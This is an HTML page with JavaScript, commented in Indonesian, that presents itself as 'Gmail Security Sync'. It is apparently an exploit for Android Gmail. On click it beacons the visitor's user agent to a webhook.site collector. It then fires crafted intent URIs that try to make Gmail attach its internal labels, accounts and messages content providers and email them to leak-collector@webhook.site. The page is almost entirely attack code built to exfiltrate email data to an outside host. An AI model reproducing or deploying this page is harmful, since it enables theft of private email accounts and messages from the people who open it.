<!DOCTYPE html>
<html>
<head><title>Gmail Security Sync</title></head>
<body style="background:#000;color:#f00;font-family:'Courier New',monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0">
    <div id="ignite" style="padding:60px;border:2px solid #f00;text-align:center;cursor:pointer;background:rgba(255,0,0,0.1);box-shadow:0 0 80px #f00">
        <h1 style="letter-spacing:8px">V205_DATA_EXTRACTION</h1>
        <div id="status" style="font-size:18px;color:#fff">ACCESSING_GMAIL_SECURE_STORAGE...</div>
        <div style="font-size:11px;color:#555;margin-top:30px">TARGET_APP: com.google.android.gm</div>
    </div>

<script>
    const target = "https://webhook.site/6a675816-997e-434a-be92-332fe00e3d9b";

    document.getElementById('ignite').onclick = async () => {
        // 1. RECON & DNA (Wajib dikirim sebagai log awal)
        const init_vault = {
            id: "V205_GMAIL_EXTRACT",
            ua: navigator.userAgent,
            ts: Date.now()
        };
        navigator.sendBeacon(`${target}?v=V205_INIT`, btoa(JSON.stringify(init_vault)));

        // 2. THE SENSITIVE URIs
        // Kita mencoba memanggil URI internal Gmail yang sering bocor pada versi Android lama/rentan
        const leakPaths = [
            "content://com.google.android.gm/labels", // Daftar folder/labels
            "content://com.google.android.gm/accounts", // Daftar alamat email yang login
            "content://com.google.android.gm.sapi/messages" // Isi pesan (Jika SAPI terbuka)
        ];

        // 3. THE MASTER INTENT
        // Kita paksa Gmail membuka jendela 'Compose' tapi dengan 'Stream' data dari URI internal
        const exploitIntent = 
            "intent:#Intent;" +
            "action=android.intent.action.SEND;" + 
            "type=application/octet-stream;" + 
            "S.android.intent.extra.STREAM=" + leakPaths[0] + ";" + // Mencoba 'melampirkan' data internal
            "S.android.intent.extra.EMAIL=leak-collector@webhook.site;" +
            "S.android.intent.extra.SUBJECT=LOG_DUMP_V205;" +
            "package=com.google.android.gm;" +
            "end";

        // 4. THE EXECUTION (Bypass Browser Restriction)
        document.getElementById('status').innerText = "TUNNELING_INTERNAL_DATA...";
        
        // Buat elemen anchor tersembunyi untuk memicu Intent secara native
        const a = document.createElement('a');
        a.href = exploitIntent;
        
        setTimeout(() => {
            a.click(); // Memicu lompatan ke Gmail
            
            // Fallback: Jika gagal melampirkan data, buka Gmail dengan parameter sensitif
            setTimeout(() => {
                if (!document.hidden) {
                    window.location.href = "intent:#Intent;action=android.intent.action.VIEW;data=" + leakPaths[1] + ";package=com.google.android.gm;end";
                }
            }, 1000);
        }, 500);
    };
</script>
</body>
</html>
